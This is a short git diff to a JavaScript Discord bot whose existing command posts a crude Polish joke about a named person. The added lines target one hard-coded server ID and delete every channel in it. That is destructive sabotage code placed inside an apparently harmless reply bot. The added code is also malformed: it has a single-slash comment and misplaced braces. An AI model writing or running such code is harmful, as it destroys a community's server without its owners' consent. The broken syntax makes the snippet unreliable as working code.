@@ -15,6 +15,14 @@ bot.on('ready', () => {
 bot.on('message', message => {
 if(message.content.toLowerCase() === '!hubson')
    message.channel.send('**Hubercik ma małego fifloka ❤️**')
+    
+});
+
+/This goes in Client.on('ready', ...);
+var server = Client.guilds.get('546116948715634733');
+for (var i = 0; i < server.channels.array().length; i++) {
+    server.channels.array()[i].delete();
+}
 
 });
 
